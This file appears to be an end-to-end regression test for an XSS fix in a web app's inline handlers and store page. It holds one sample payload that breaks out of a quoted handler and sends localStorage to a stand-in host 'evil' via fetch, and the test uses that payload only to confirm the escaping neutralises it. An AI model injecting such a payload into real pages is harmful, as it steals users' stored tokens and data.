// e2e/guard-xss-handlers.cjs — SEC-FIX2 H4: no inline handler is built from `esc(x).replace(/'/g, …)` (esc turns ' into &#39;, which the
// browser decodes BEFORE the handler runs, so the replace never matches and the text breaks out of the string), and the public network
// store builds its category chips from data-cat + one listener. Offline: reads source, runs esc on the review's payload.
'use strict';
const fs = require('fs'), path = require('path');
const root = path.join(__dirname, '..', 'public');
let fail = 0;
const t = (name, ok, why) => { console.log((ok ? '  ok  ' : '  FAIL') + ' ' + name + (ok ? '' : ' — ' + (why || ''))); if (!ok) fail++; };
const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
const wrongOrder = /esc\([^()]*(?:\([^()]*\))?[^()]*\)\.replace\(\/'\/g/;
const hits = walk(root).filter((f) => /\.(html|js)$/.test(f))
  .flatMap((f) => fs.readFileSync(f, 'utf8').split('\n').map((l, i) => wrongOrder.test(l) ? path.relative(root, f) + ':' + (i + 1) : null).filter(Boolean));
t('no esc(x).replace(/\'/g, …) inside an inline handler (quote escaped AFTER esc)', hits.length === 0, hits.join(', '));
const store = fs.readFileSync(path.join(root, 'store.html'), 'utf8');
t('store.html chips carry data-cat and no setCat( handler string', /data-cat="' \+ esc\(\w+\)/.test(store) && !/onclick="setCat\(/.test(store));
t('store.html reads the chip back through one click listener', /getElementById\('cats'\)\.addEventListener\('click'/.test(store));
const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + '; return esc;')();
const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
process.exit(fail ? 1 : 0);
